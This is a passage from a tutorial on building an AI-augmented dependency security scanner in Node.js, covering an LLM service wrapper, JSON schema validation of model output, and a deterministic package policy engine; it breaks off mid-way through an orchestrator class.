# Phase 4, Part 1: AI-Augmented Software Supply Chain Security

Welcome to the final phase of our journey! Now we'll integrate Large Language Models (LLMs) into our security workflow, using AI to provide context, explanations, and intelligent triage while maintaining deterministic security controls. This is where security meets intelligence—augmenting human judgment without replacing it.

---

## The Target: AI-Augmented Security Analysis

**What specific file, configuration, or feature are we building right now?**

We're building an AI-augmented security analysis system that:
1. Integrates LLM APIs (OpenAI, Anthropic, or local models) for intelligent analysis
2. Generates human-readable explanations of security findings
3. Provides context-aware dependency triage and prioritization
4. Validates AI outputs using strict JSON Schema
5. Enforces deterministic security policies that AI cannot override
6. Creates audit trails of AI-assisted decisions
7. Integrates with CI/CD pipelines while maintaining security boundaries

---

## The Concept: AI as a Security Consultant

**A brief, clear explanation using a simple, real-world analogy**

Think of AI in security like having a team of expert security consultants:

1. **Intelligent Analysis** - Like consultants who can look at code and explain what it does
2. **Context Awareness** - Like consultants who understand your specific environment and threats
3. **Explanations** - Like consultants who can translate technical findings into plain English
4. **Triage** - Like consultants who can prioritize which issues to fix first
5. **Documentation** - Like consultants who can write comprehensive security reports

**However, with strict guardrails:**

1. **AI Advises, Humans Decide** - AI makes recommendations, but decisions are made by policies
2. **Structured Outputs** - AI responses must follow a strict format
3. **Validation Required** - Every AI output is validated before use
4. **Audit Trail** - Every AI interaction is logged for review
5. **Fallback Policies** - If AI fails, deterministic policies take over

---

## The Implementation: AI-Augmented Security

### Step 1: Setup and Dependencies

```bash
# Navigate to the phase-4 directory
cd beyond-cves-tutorial
mkdir -p phase-4
cd phase-4

# Initialize the project
npm init -y

# Install required dependencies
npm install --save-dev openai
npm install --save-dev chalk
npm install --save-dev ora
npm install --save-dev dotenv
npm install --save-dev ajv
npm install --save-dev @anthropic-ai/sdk
```

### Step 2: Create the LLM Service

```javascript
// path: phase-4/src/llm-service.js

/**
 * LLM SERVICE
 * 
 * Provides a unified interface for interacting with LLM providers
 * (OpenAI, Anthropic, etc.) with built-in error handling, retries,
 * and structured output validation.
 * 
 * Usage:
 *   const llm = new LLMService({ provider: 'openai' });
 *   const response = await llm.analyzeSecurityIssue(data);
 */

const { OpenAI } = require('openai');
const { Anthropic } = require('@anthropic-ai/sdk');
const chalk = require('chalk');
const { EventEmitter } = require('events');

class LLMService extends EventEmitter {
    constructor(options = {}) {
        super();
        
        this.options = {
            provider: options.provider || process.env.LLM_PROVIDER || 'openai',
            model: options.model || this.getDefaultModel(options.provider),
            apiKey: options.apiKey || this.getApiKey(options.provider),
            temperature: options.temperature || 0.3, // Lower = more deterministic
            maxTokens: options.maxTokens || 1000,
            timeout: options.timeout || 30000,
            retries: options.retries || 2,
            ...options
        };
        
        // Initialize the appropriate client
        this.client = this.initializeClient();
        
        // Track usage
        this.usage = {
            totalRequests: 0,
            totalTokens: 0,
            totalCost: 0,
            errors: 0,
            history: []
        };
    }

    /**
     * Gets the default model for a provider
     */
    getDefaultModel(provider) {
        const defaults = {
            openai: 'gpt-4-turbo-preview',
            anthropic: 'claude-3-opus-20240229',
            deepseek: 'deepseek-chat'
        };
        return defaults[provider] || 'gpt-3.5-turbo';
    }

    /**
     * Gets the API key for a provider
     */
    getApiKey(provider) {
        const keyMap = {
            openai: process.env.OPENAI_API_KEY,
            anthropic: process.env.ANTHROPIC_API_KEY,
            deepseek: process.env.DEEPSEEK_API_KEY
        };
        const key = keyMap[provider];
        if (!key) {
            console.warn(chalk.yellow(`⚠️  No API key found for ${provider}. Using mock mode.`));
            return 'mock-key';
        }
        return key;
    }

    /**
     * Initializes the LLM client
     */
    initializeClient() {
        const provider = this.options.provider;
        
        try {
            switch (provider) {
                case 'openai':
                    return new OpenAI({
                        apiKey: this.options.apiKey,
                        timeout: this.options.timeout
                    });
                case 'anthropic':
                    return new Anthropic({
                        apiKey: this.options.apiKey,
                        timeout: this.options.timeout
                    });
                default:
                    throw new Error(`Unsupported provider: ${provider}`);
            }
        } catch (error) {
            console.warn(chalk.yellow(`⚠️  Could not initialize ${provider} client: ${error.message}`));
            return null;
        }
    }

    /**
     * Analyzes a security issue with the LLM
     * @param {Object} data - Security data to analyze
     * @param {string} prompt - Custom prompt (optional)
     * @returns {Object} - Structured analysis result
     */
    async analyzeSecurityIssue(data, prompt = null) {
        // If no client, use mock mode
        if (!this.client) {
            return this.mockAnalysis(data);
        }
        
        this.usage.totalRequests++;
        
        try {
            // Build the prompt if not provided
            const promptText = prompt || this.buildSecurityPrompt(data);
            
            // Call the LLM
            const response = await this.callLLM(promptText);
            
            // Parse and validate the response
            const parsedResponse = this.parseResponse(response);
            
            // Validate against schema
            const validated = this.validateResponse(parsedResponse);
            
            // Track usage
            if (response.usage) {
                this.usage.totalTokens += response.usage.total_tokens || 0;
                this.usage.totalCost += this.estimateCost(response.usage);
            }
            
            // Log history
            this.usage.history.push({
                timestamp: Date.now(),
                prompt: promptText.substring(0, 200) + '...',
                response: validated,
                usage: response.usage
            });
            
            this.emit('analysisComplete', { data, response: validated });
            
            return validated;
            
        } catch (error) {
            this.usage.errors++;
            this.emit('error', error);
            
            console.error(chalk.red(`❌ LLM analysis failed: ${error.message}`));
            
            // Return fallback analysis
            return this.getFallbackAnalysis(data);
        }
    }

    /**
     * Calls the LLM API
     */
    async callLLM(prompt, retries = this.options.retries) {
        const provider = this.options.provider;
        
        for (let attempt = 0; attempt <= retries; attempt++) {
            try {
                let response;
                
                if (provider === 'openai') {
                    response = await this.callOpenAI(prompt);
                } else if (provider === 'anthropic') {
                    response = await this.callAnthropic(prompt);
                } else {
                    throw new Error(`Unsupported provider: ${provider}`);
                }
                
                return response;
                
            } catch (error) {
                if (attempt === retries) {
                    throw error;
                }
                
                const waitTime = Math.pow(2, attempt) * 1000;
                console.log(chalk.yellow(`🔄 Retrying LLM call (attempt ${attempt + 1}/${retries + 1})...`));
                await this.delay(waitTime);
            }
        }
        
        throw new Error('All LLM retries failed');
    }

    /**
     * Calls OpenAI API
     */
    async callOpenAI(prompt) {
        const response = await this.client.chat.completions.create({
            model: this.options.model,
            messages: [
                { role: 'system', content: this.getSystemPrompt() },
                { role: 'user', content: prompt }
            ],
            temperature: this.options.temperature,
            max_tokens: this.options.maxTokens,
            response_format: { type: 'json_object' }
        });
        
        return {
            content: response.choices[0].message.content,
            usage: response.usage
        };
    }

    /**
     * Calls Anthropic API
     */
    async callAnthropic(prompt) {
        const response = await this.client.messages.create({
            model: this.options.model,
            max_tokens: this.options.maxTokens,
            system: this.getSystemPrompt(),
            messages: [
                { role: 'user', content: prompt }
            ]
        });
        
        return {
            content: response.content[0].text,
            usage: {
                total_tokens: response.usage.input_tokens + response.usage.output_tokens,
                input_tokens: response.usage.input_tokens,
                output_tokens: response.usage.output_tokens
            }
        };
    }

    /**
     * Gets the system prompt for security analysis
     */
    getSystemPrompt() {
        return `You are a security expert specializing in software supply chain security and dependency analysis. 
Your task is to analyze security findings and provide clear, actionable insights.

You must ALWAYS respond with valid JSON following this schema:
{
  "summary": "Brief summary of the issue (max 100 characters)",
  "riskLevel": "CRITICAL|HIGH|MEDIUM|LOW|INFO",
  "explanation": "Detailed explanation of the issue, including why it matters",
  "recommendation": "Specific, actionable recommendation to address the issue",
  "urgency": "IMMEDIATE|HIGH|MEDIUM|LOW|PLANNED",
  "context": "Additional context about the issue and its implications",
  "references": ["Array of relevant references or documentation"]
}

Be thorough but concise. Focus on actionable insights. Always prioritize security best practices.
Never recommend insecure solutions. If you're unsure, clearly state that more information is needed.`;
    }

    /**
     * Builds a prompt for security analysis
     */
    buildSecurityPrompt(data) {
        return `
Please analyze the following security finding:

Package: ${data.packageName || 'unknown'}@${data.version || 'unknown'}

${data.capabilities ? `Capabilities detected: ${JSON.stringify(data.capabilities, null, 2)}` : ''}
${data.vulnerabilities ? `Vulnerabilities found: ${JSON.stringify(data.vulnerabilities, null, 2)}` : ''}
${data.riskFactors ? `Risk factors: ${JSON.stringify(data.riskFactors, null, 2)}` : ''}
${data.context ? `Additional context: ${data.context}` : ''}

${data.scanResults ? `Scan Results:\n${JSON.stringify(data.scanResults, null, 2)}` : ''}

Provide a comprehensive security analysis with clear recommendations.
`;
    }

    /**
     * Parses the LLM response
     */
    parseResponse(response) {
        try {
            const content = response.content;
            
            // Try to parse as JSON
            let parsed = JSON.parse(content);
            
            // Ensure required fields exist
            const requiredFields = ['summary', 'riskLevel', 'explanation', 'recommendation', 'urgency'];
            for (const field of requiredFields) {
                if (!parsed[field]) {
                    parsed[field] = this.getDefaultValue(field);
                }
            }
            
            // Ensure riskLevel is valid
            const validLevels = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO'];
            if (!validLevels.includes(parsed.riskLevel)) {
                parsed.riskLevel = 'INFO';
            }
            
            // Ensure urgency is valid
            const validUrgencies = ['IMMEDIATE', 'HIGH', 'MEDIUM', 'LOW', 'PLANNED'];
            if (!validUrgencies.includes(parsed.urgency)) {
                parsed.urgency = 'MEDIUM';
            }
            
            return parsed;
            
        } catch (error) {
            console.warn(chalk.yellow(`⚠️  Could not parse LLM response: ${error.message}`));
            
            // Try to extract JSON from text
            const jsonMatch = response.content.match(/\{[\s\S]*\}/);
            if (jsonMatch) {
                try {
                    return JSON.parse(jsonMatch[0]);
                } catch (e) {
                    // Fall through
                }
            }
            
            // Fallback to default response
            return this.getDefaultResponse();
        }
    }

    /**
     * Validates the response against the schema
     */
    validateResponse(response) {
        // Simple validation - ensure required fields
        const required = ['summary', 'riskLevel', 'explanation', 'recommendation', 'urgency'];
        for (const field of required) {
            if (!response[field]) {
                response[field] = this.getDefaultValue(field);
            }
        }
        
        // Validate risk level
        const validLevels = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO'];
        if (!validLevels.includes(response.riskLevel)) {
            response.riskLevel = 'INFO';
        }
        
        // Validate urgency
        const validUrgencies = ['IMMEDIATE', 'HIGH', 'MEDIUM', 'LOW', 'PLANNED'];
        if (!validUrgencies.includes(response.urgency)) {
            response.urgency = 'MEDIUM';
        }
        
        return response;
    }

    /**
     * Gets default values for fields
     */
    getDefaultValue(field) {
        const defaults = {
            summary: 'Security finding detected',
            riskLevel: 'MEDIUM',
            explanation: 'Further analysis required to determine the full impact',
            recommendation: 'Review the finding manually and apply appropriate remediation',
            urgency: 'MEDIUM',
            context: 'No additional context available'
        };
        return defaults[field] || 'N/A';
    }

    /**
     * Gets a default response
     */
    getDefaultResponse() {
        return {
            summary: 'Security issue identified',
            riskLevel: 'MEDIUM',
            explanation: 'The detected issue requires human review to determine the exact risk',
            recommendation: 'Conduct manual security review of the package',
            urgency: 'MEDIUM',
            context: 'AI analysis was unable to complete. Please review manually.',
            references: ['https://docs.npmjs.com/auditing-package-dependencies']
        };
    }

    /**
     * Fallback analysis for when API is unavailable
     */
    getFallbackAnalysis(data) {
        return {
            summary: `${data.packageName || 'Package'} requires manual review`,
            riskLevel: data.riskLevel || 'MEDIUM',
            explanation: `Automated analysis was unable to complete for ${data.packageName}. This may be due to API limitations or complex dependencies.`,
            recommendation: 'Review the package manually using the security scanner report',
            urgency: 'MEDIUM',
            context: data.context || 'Fallback analysis mode active',
            references: ['https://socket.dev/docs', 'https://snyk.io/docs']
        };
    }

    /**
     * Mock analysis for development mode
     */
    mockAnalysis(data) {
        const riskLevels = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO'];
        const riskLevel = riskLevels[Math.floor(Math.random() * riskLevels.length)];
        const urgencies = ['IMMEDIATE', 'HIGH', 'MEDIUM', 'LOW', 'PLANNED'];
        const urgency = urgencies[Math.floor(Math.random() * urgencies.length)];
        
        return {
            summary: `${data.packageName || 'Package'} security analysis (mock)`,
            riskLevel,
            explanation: `Mock analysis for ${data.packageName} with risk level ${riskLevel}. This is generated when no LLM API is available.`,
            recommendation: `Review ${data.packageName} manually for ${riskLevel} risk issues`,
            urgency,
            context: 'Mock analysis mode - API unavailable',
            references: ['https://docs.npmjs.com/auditing-package-dependencies']
        };
    }

    /**
     * Estimates the cost of an API call
     */
    estimateCost(usage) {
        const costs = {
            'gpt-4-turbo-preview': { input: 0.00001, output: 0.00003 },
            'gpt-3.5-turbo': { input: 0.000001, output: 0.000002 },
            'claude-3-opus-20240229': { input: 0.000015, output: 0.000075 },
            'claude-3-sonnet-20240229': { input: 0.000003, output: 0.000015 }
        };
        
        const modelCost = costs[this.options.model] || costs['gpt-3.5-turbo'];
        const inputCost = (usage.input_tokens || 0) * modelCost.input;
        const outputCost = (usage.output_tokens || 0) * modelCost.output;
        
        return inputCost + outputCost;
    }

    /**
     * Delays execution
     */
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    /**
     * Gets usage statistics
     */
    getUsage() {
        return {
            totalRequests: this.usage.totalRequests,
            totalTokens: this.usage.totalTokens,
            totalCost: this.usage.totalCost,
            errors: this.usage.errors,
            recentHistory: this.usage.history.slice(-10)
        };
    }

    /**
     * Clears history
     */
    clearHistory() {
        this.usage.history = [];
    }
}

module.exports = LLMService;
```

### Step 3: Create the JSON Schema Validator

```javascript
// path: phase-4/src/schema-validator.js

/**
 * JSON SCHEMA VALIDATOR
 * 
 * Validates structured data against JSON Schemas.
 * Ensures AI outputs are properly formatted before use.
 * 
 * Usage:
 *   const validator = new SchemaValidator();
 *   const isValid = validator.validate(data, schema);
 */

const Ajv = require('ajv');
const chalk = require('chalk');

class SchemaValidator {
    constructor(options = {}) {
        this.options = {
            strict: options.strict !== false,
            verbose: options.verbose || false,
            ...options
        };
        
        // Initialize Ajv with strict mode
        this.ajv = new Ajv({
            strict: this.options.strict,
            verbose: this.options.verbose,
            allErrors: true
        });
        
        // Cache compiled schemas
        this.schemaCache = new Map();
        
        // Track validation statistics
        this.stats = {
            totalValidations: 0,
            passed: 0,
            failed: 0,
            bySchema: {}
        };
    }

    /**
     * Validates data against a schema
     * @param {Object} data - Data to validate
     * @param {Object} schema - JSON Schema to validate against
     * @param {string} schemaName - Name of the schema (for tracking)
     * @returns {Object} - Validation result
     */
    validate(data, schema, schemaName = 'unnamed') {
        this.stats.totalValidations++;
        
        // Compile or retrieve the schema
        let validateFn;
        if (this.schemaCache.has(schemaName)) {
            validateFn = this.schemaCache.get(schemaName);
        } else {
            try {
                validateFn = this.ajv.compile(schema);
                this.schemaCache.set(schemaName, validateFn);
            } catch (error) {
                throw new Error(`Invalid schema: ${error.message}`);
            }
        }
        
        // Validate the data
        const isValid = validateFn(data);
        
        // Track results
        if (isValid) {
            this.stats.passed++;
            this.stats.bySchema[schemaName] = this.stats.bySchema[schemaName] || { passed: 0, failed: 0 };
            this.stats.bySchema[schemaName].passed++;
        } else {
            this.stats.failed++;
            this.stats.bySchema[schemaName] = this.stats.bySchema[schemaName] || { passed: 0, failed: 0 };
            this.stats.bySchema[schemaName].failed++;
        }
        
        return {
            isValid,
            errors: validateFn.errors || [],
            schemaName
        };
    }

    /**
     * Validates and throws if invalid
     */
    validateOrThrow(data, schema, schemaName = 'unnamed') {
        const result = this.validate(data, schema, schemaName);
        
        if (!result.isValid) {
            const errors = result.errors.map(e => 
                `${e.instancePath} ${e.message}`
            ).join('\n');
            
            throw new Error(`Schema validation failed:\n${errors}`);
        }
        
        return true;
    }

    /**
     * Validates a security analysis output
     */
    validateSecurityAnalysis(data) {
        const schema = {
            type: 'object',
            required: ['summary', 'riskLevel', 'explanation', 'recommendation', 'urgency'],
            properties: {
                summary: { type: 'string', maxLength: 200 },
                riskLevel: { 
                    type: 'string', 
                    enum: ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']
                },
                explanation: { type: 'string', maxLength: 1000 },
                recommendation: { type: 'string', maxLength: 500 },
                urgency: {
                    type: 'string',
                    enum: ['IMMEDIATE', 'HIGH', 'MEDIUM', 'LOW', 'PLANNED']
                },
                context: { type: 'string', maxLength: 500 },
                references: { 
                    type: 'array', 
                    items: { type: 'string' }
                }
            },
            additionalProperties: true
        };
        
        return this.validate(data, schema, 'securityAnalysis');
    }

    /**
     * Validates a package scan result
     */
    validatePackageScan(data) {
        const schema = {
            type: 'object',
            required: ['name', 'version', 'status'],
            properties: {
                name: { type: 'string', minLength: 1 },
                version: { type: 'string' },
                status: {
                    type: 'string',
                    enum: ['success', 'failed', 'pending', 'not_found']
                },
                riskScore: { type: 'number', minimum: 0, maximum: 100 },
                riskLevel: {
                    type: 'string',
                    enum: ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'UNKNOWN']
                },
                capabilities: { type: 'array' },
                vulnerabilities: { type: 'array' },
                errors: { type: 'array', items: { type: 'string' } },
                scanTime: { type: 'number' }
            }
        };
        
        return this.validate(data, schema, 'packageScan');
    }

    /**
     * Validates a CI/CD report
     */
    validateCIReport(data) {
        const schema = {
            type: 'object',
            required: ['scanId', 'status', 'summary'],
            properties: {
                scanId: { type: 'string' },
                timestamp: { type: 'string' },
                status: { type: 'string', enum: ['PASS', 'FAIL'] },
                summary: {
                    type: 'object',
                    required: ['total', 'successful', 'failed', 'critical', 'high', 'medium', 'low'],
                    properties: {
                        total: { type: 'number' },
                        successful: { type: 'number' },
                        failed: { type: 'number' },
                        critical: { type: 'number' },
                        high: { type: 'number' },
                        medium: { type: 'number' },
                        low: { type: 'number' },
                        averageScore: { type: 'number' }
                    }
                },
                results: { type: 'array' },
                recommendations: { type: 'array' }
            }
        };
        
        return this.validate(data, schema, 'ciReport');
    }

    /**
     * Sanitizes data to ensure it matches a schema
     */
    sanitize(data, schema, defaultValues = {}) {
        const result = { ...defaultValues };
        
        // Add required fields with defaults
        if (schema.required) {
            for (const field of schema.required) {
                if (data[field] !== undefined) {
                    result[field] = data[field];
                } else if (defaultValues[field] !== undefined) {
                    result[field] = defaultValues[field];
                } else {
                    // Use default based on schema type
                    const propSchema = schema.properties[field];
                    if (propSchema) {
                        if (propSchema.type === 'string') {
                            result[field] = '';
                        } else if (propSchema.type === 'number') {
                            result[field] = 0;
                        } else if (propSchema.type === 'boolean') {
                            result[field] = false;
                        } else if (propSchema.type === 'array') {
                            result[field] = [];
                        } else if (propSchema.type === 'object') {
                            result[field] = {};
                        }
                    }
                }
            }
        }
        
        // Add other fields if they match the schema
        if (schema.properties) {
            for (const [field, propSchema] of Object.entries(schema.properties)) {
                if (data[field] !== undefined) {
                    const value = data[field];
                    // Type check
                    if (this.isType(value, propSchema.type)) {
                        result[field] = value;
                    }
                }
            }
        }
        
        return result;
    }

    /**
     * Checks if a value matches a type
     */
    isType(value, type) {
        switch (type) {
            case 'string':
                return typeof value === 'string';
            case 'number':
                return typeof value === 'number' && !isNaN(value);
            case 'integer':
                return Number.isInteger(value);
            case 'boolean':
                return typeof value === 'boolean';
            case 'array':
                return Array.isArray(value);
            case 'object':
                return typeof value === 'object' && !Array.isArray(value) && value !== null;
            default:
                return true;
        }
    }

    /**
     * Gets validation statistics
     */
    getStats() {
        return {
            totalValidations: this.stats.totalValidations,
            passed: this.stats.passed,
            failed: this.stats.failed,
            successRate: this.stats.totalValidations > 0 
                ? (this.stats.passed / this.stats.totalValidations) * 100 
                : 0,
            bySchema: this.stats.bySchema
        };
    }

    /**
     * Clears the schema cache
     */
    clearCache() {
        this.schemaCache.clear();
    }

    /**
     * Prints validation statistics
     */
    printStats() {
        const stats = this.getStats();
        
        console.log(chalk.bold.cyan('\n📊 Schema Validation Statistics'));
        console.log(chalk.cyan('='.repeat(40)));
        console.log(`Total Validations: ${stats.totalValidations}`);
        console.log(`Passed: ${chalk.green(stats.passed)}`);
        console.log(`Failed: ${chalk.red(stats.failed)}`);
        console.log(`Success Rate: ${stats.successRate.toFixed(1)}%`);
        
        if (Object.keys(stats.bySchema).length > 0) {
            console.log('\nBy Schema:');
            for (const [name, counts] of Object.entries(stats.bySchema)) {
                const total = counts.passed + counts.failed;
                const rate = total > 0 ? (counts.passed / total) * 100 : 0;
                console.log(`  ${name}: ${counts.passed}/${total} (${rate.toFixed(1)}%)`);
            }
        }
        console.log(chalk.cyan('='.repeat(40)));
    }
}

module.exports = SchemaValidator;
```

### Step 4: Create the Security Policy Engine

```javascript
// path: phase-4/src/policy-engine.js

/**
 * SECURITY POLICY ENGINE
 * 
 * Enforces deterministic security policies that AI cannot override.
 * Policies are defined in a configuration file or database.
 * 
 * Usage:
 *   const policy = new PolicyEngine();
 *   const decision = policy.evaluate(scanResult);
 */

const chalk = require('chalk');

class PolicyEngine {
    constructor(options = {}) {
        this.options = {
            policies: options.policies || this.getDefaultPolicies(),
            strictMode: options.strictMode !== false,
            ...options
        };
        
        this.policyCache = new Map();
        this.decisions = [];
        this.stats = {
            totalEvaluations: 0,
            approved: 0,
            blocked: 0,
            pendingReview: 0,
            byRiskLevel: {}
        };
    }

    /**
     * Gets default security policies
     */
    getDefaultPolicies() {
        return {
            // Risk level policies
            riskLevelPolicies: {
                CRITICAL: {
                    action: 'BLOCK',
                    requireReview: true,
                    message: 'Critical risk packages are automatically blocked',
                    exceptionable: false
                },
                HIGH: {
                    action: 'REVIEW',
                    requireReview: true,
                    message: 'High risk packages require manual review',
                    exceptionable: true
                },
                MEDIUM: {
                    action: 'REVIEW',
                    requireReview: true,
                    message: 'Medium risk packages require review',
                    exceptionable: true
                },
                LOW: {
                    action: 'APPROVE',
                    requireReview: false,
                    message: 'Low risk packages are automatically approved',
                    exceptionable: false
                },
                INFO: {
                    action: 'APPROVE',
                    requireReview: false,
                    message: 'Informational findings only - automatically approved',
                    exceptionable: false
                }
            },
            
            // Capability policies
            capabilityPolicies: {
                SHELL_EXECUTION: {
                    action: 'BLOCK',
                    requireReview: true,
                    message: 'Packages with shell execution capabilities are blocked',
                    exceptionable: false
                },
                DYNAMIC_CODE: {
                    action: 'BLOCK',
                    requireReview: true,
                    message: 'Packages with dynamic code execution are blocked',
                    exceptionable: false
                },
                FILESYSTEM_ACCESS: {
                    action: 'REVIEW',
                    requireReview: true,
                    message: 'Packages with filesystem access require review',
                    exceptionable: true
                },
                NETWORK_ACCESS: {
                    action: 'REVIEW',
                    requireReview: true,
                    message: 'Packages with network access require review',
                    exceptionable: true
                },
                ENVIRONMENT_ACCESS: {
                    action: 'REVIEW',
                    requireReview: true,
                    message: 'Packages with environment access require review',
                    exceptionable: true
                }
            },
            
            // Vulnerability policies
            vulnerabilityPolicies: {
                CRITICAL: {
                    action: 'BLOCK',
                    requireReview: true,
                    message: 'Packages with critical vulnerabilities are blocked',
                    exceptionable: false
                },
                HIGH: {
                    action: 'REVIEW',
                    requireReview: true,
                    message: 'Packages with high vulnerabilities require review',
                    exceptionable: true
                }
            },
            
            // Package type policies
            packageTypePolicies: {
                production: {
                    requireReview: true,
                    message: 'Production dependencies require review'
                },
                development: {
                    requireReview: false,
                    message: 'Development dependencies are less restrictive'
                }
            }
        };
    }

    /**
     * Evaluates a scan result against policies
     * @param {Object} result - Scan result to evaluate
     * @returns {Object} - Policy decision
     */
    evaluate(result) {
        this.stats.totalEvaluations++;
        
        const decision = {
            packageName: result.name,
            version: result.version,
            timestamp: new Date().toISOString(),
            actions: [],
            isApproved: false,
            isBlocked: false,
            requiresReview: false,
            reason: [],
            riskLevel: result.riskLevel || 'UNKNOWN'
        };
        
        // 1. Evaluate risk level
        const riskPolicy = this.options.policies.riskLevelPolicies[decision.riskLevel];
        if (riskPolicy) {
            decision.actions.push({
                type: 'risk_level',
                action: riskPolicy.action,
                message: riskPolicy.message
            });
            
            if (riskPolicy.action === 'BLOCK') {
                decision.isBlocked = true;
                decision.reason.push(riskPolicy.message);
            }
            
            if (riskPolicy.requireReview) {
                decision.requiresReview = true;
            }
        }
        
        // 2. Evaluate capabilities
        if (result.capabilities) {
            for (const capability of result.capabilities) {
                const capPolicy = this.options.policies.capabilityPolicies[capability.type];
                if (capPolicy) {
                    decision.actions.push({
                        type: 'capability',
                        capability: capability.type,
                        action: capPolicy.action,
                        message: capPolicy.message
                    });
                    
                    if (capPolicy.action === 'BLOCK') {
                        decision.isBlocked = true;
                        decision.reason.push(capPolicy.message);
                    }
                    
                    if (capPolicy.requireReview) {
                        decision.requiresReview = true;
                    }
                }
            }
        }
        
        // 3. Evaluate vulnerabilities
        if (result.vulnerabilities) {
            for (const vuln of result.vulnerabilities) {
                const vulnPolicy = this.options.policies.vulnerabilityPolicies[vuln.severity];
                if (vulnPolicy) {
                    decision.actions.push({
                        type: 'vulnerability',
                        severity: vuln.severity,
                        action: vulnPolicy.action,
                        message: vulnPolicy.message
                    });
                    
                    if (vulnPolicy.action === 'BLOCK') {
                        decision.isBlocked = true;
                        decision.reason.push(vulnPolicy.message);
                    }
                    
                    if (vulnPolicy.requireReview) {
                        decision.requiresReview = true;
                    }
                }
            }
        }
        
        // 4. Evaluate package type
        if (result.type) {
            const typePolicy = this.options.policies.packageTypePolicies[result.type];
            if (typePolicy && typePolicy.requireReview) {
                decision.requiresReview = true;
            }
        }
        
        // 5. Apply override: if not blocked, approve
        if (!decision.isBlocked) {
            decision.isApproved = true;
        }
        
        // 6. Track statistics
        this.decisions.push(decision);
        this.stats.byRiskLevel[decision.riskLevel] = (this.stats.byRiskLevel[decision.riskLevel] || 0) + 1;
        
        if (decision.isApproved) this.stats.approved++;
        if (decision.isBlocked) this.stats.blocked++;
        if (decision.requiresReview) this.stats.pendingReview++;
        
        return decision;
    }

    /**
     * Evaluates multiple results
     */
    evaluateAll(results) {
        const decisions = [];
        for (const result of results) {
            decisions.push(this.evaluate(result));
        }
        return decisions;
    }

    /**
     * Generates a policy report
     */
    generateReport() {
        return {
            totalEvaluations: this.stats.totalEvaluations,
            approved: this.stats.approved,
            blocked: this.stats.blocked,
            pendingReview: this.stats.pendingReview,
            byRiskLevel: this.stats.byRiskLevel,
            decisions: this.decisions.slice(-100), // Last 100 decisions
            timestamp: new Date().toISOString()
        };
    }

    /**
     * Checks if a decision can be overridden
     */
    isOverridable(decision) {
        // Check if any action is exceptionable
        for (const action of decision.actions) {
            // Look up the policy
            for (const policyGroup of ['riskLevelPolicies', 'capabilityPolicies', 'vulnerabilityPolicies']) {
                const policy = this.options.policies[policyGroup];
                if (policy) {
                    for (const [key, value] of Object.entries(policy)) {
                        if (value.action === action.action && value.exceptionable) {
                            return true;
                        }
                    }
                }
            }
        }
        return false;
    }

    /**
     * Creates an override for a blocked decision
     */
    createOverride(decision, reason, reviewer) {
        if (!this.isOverridable(decision)) {
            throw new Error('Cannot override this decision');
        }
        
        const override = {
            decisionId: Date.now().toString(36),
            packageName: decision.packageName,
            version: decision.version,
            originalDecision: decision,
            overrideReason: reason,
            reviewer: reviewer,
            timestamp: new Date().toISOString(),
            status: 'APPROVED'
        };
        
        // Add to cache
        this.policyCache.set(override.decisionId, override);
        
        return override;
    }

    /**
     * Prints policy statistics
     */
    printStats() {
        console.log(chalk.bold.cyan('\n📊 Policy Engine Statistics'));
        console.log(chalk.cyan('='.repeat(40)));
        console.log(`Total Evaluations: ${this.stats.totalEvaluations}`);
        console.log(`Approved: ${chalk.green(this.stats.approved)}`);
        console.log(`Blocked: ${chalk.red(this.stats.blocked)}`);
        console.log(`Pending Review: ${chalk.yellow(this.stats.pendingReview)}`);
        
        console.log('\nBy Risk Level:');
        for (const [level, count] of Object.entries(this.stats.byRiskLevel)) {
            const color = level === 'CRITICAL' ? chalk.red :
                         level === 'HIGH' ? chalk.yellow :
                         chalk.green;
            console.log(`  ${color(level)}: ${count}`);
        }
        console.log(chalk.cyan('='.repeat(40)));
    }

    /**
     * Resets statistics
     */
    resetStats() {
        this.stats = {
            totalEvaluations: 0,
            approved: 0,
            blocked: 0,
            pendingReview: 0,
            byRiskLevel: {}
        };
        this.decisions = [];
        this.policyCache.clear();
    }
}

module.exports = PolicyEngine;
```

### Step 5: Create the AI-Augmented Orchestrator

```javascript
// path: phase-4/src/ai-orchestrator.js

/**
 * AI-AUGMENTED ORCHESTRATOR
 * 
 * Combines all components into a complete AI-augmented security system.
 * Integrates LLM analysis with deterministic policy enforcement.
 * 
 * Usage:
 *   const orchestrator = new AIOrchestrator();
 *   const results = await orchestrator.scanAndAnalyze(packageList);
 */

const chalk = require('chalk');
const ora = require('ora');
const path = require('path');
const fs = require('fs');
const LLMService = require('./llm-service');
const SchemaValidator = require('./schema-validator');
const PolicyEngine = require('./policy-engine');

// Import Phase 3 components
const PackageScanner = require('../../phase-3/src/package-scanner');
const ResourceManager = require('../../phase-3/src/resource-manager');
const PriorityQueue = require('../../phase-3/src/priority-queue');
const StreamingResults = require('../../phase-3/src/streaming-results');

class AIOrchestrator {
    constructor(options = {}) {
        this.options = {
            concurrency: options.concurrency || 5,
            timeout: options.timeout || 60000,
            retries: options.retries || 2,
            maxMemoryPercent: options.maxMemoryPercent || 80,
            maxCpuPercent: options.maxCpuPercent || 80,
            outputFile: options.outputFile || 'ai-security-report.json',
            verbose: options.verbose || false,
            aiProvider: options.aiProvider || process.env.LLM_PROVIDER || 'openai',
            aiModel: options.aiModel || process.env.LLM_MODEL || null,
            requireAIAnalysis: options.requireAIAnalysis || false,
            ...options
        };
        
        // Initialize components
        this.llmService = new LLMService({
            provider: this.options.aiProvider,
            model: this.options.aiModel,
            verbose: this.options.verbose
        });
        
        this.schemaValidator = new SchemaValidator({
            verbose: this.options.verbose
        });
        
        this.policyEngine = new PolicyEngine({
            strictMode: this.options.requireAIAnalysis
        });
        
        this.resourceManager = new ResourceManager({
            maxMemoryPercent: this.options.maxMemoryPercent,
            maxCpuPercent: this.options.maxCpuPercent
        });
        
        this.priorityQueue = new PriorityQueue({
            maxSize: 10000
        });
        
        this.streamingResults = new StreamingResults({
            outputFile: this.options.outputFile,
            format: 'json'
        });
        
        this.packageScanner = new PackageScanner({
            concurrency: this.options.concurrency,
            timeout: this.options.timeout,
            retries: this.options.retries,
            verbose: this.options.verbose
        });
        
        // State tracking
        this.isRunning = false;
        this.scanId = Date.now().toString(36);
